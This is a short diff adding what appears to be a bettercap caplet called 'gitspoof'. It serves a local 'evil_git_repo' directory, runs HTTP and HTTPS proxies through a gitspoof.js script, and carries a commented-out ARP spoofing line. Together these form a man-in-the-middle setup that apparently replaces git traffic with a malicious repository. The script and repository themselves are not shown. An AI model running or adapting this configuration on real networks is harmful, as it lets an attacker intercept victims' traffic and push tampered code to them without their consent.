@@ -1,0 +1,9 @@
+set http.server.path caplets/gitspoof/evil_git_repo
+http.server on
+
+set http.proxy.script caplets/gitspoof/gitspoof.js
+set https.proxy.script caplets/gitspoof/gitspoof.js
+http.proxy on
+https.proxy on
+
+# arp.spoof on
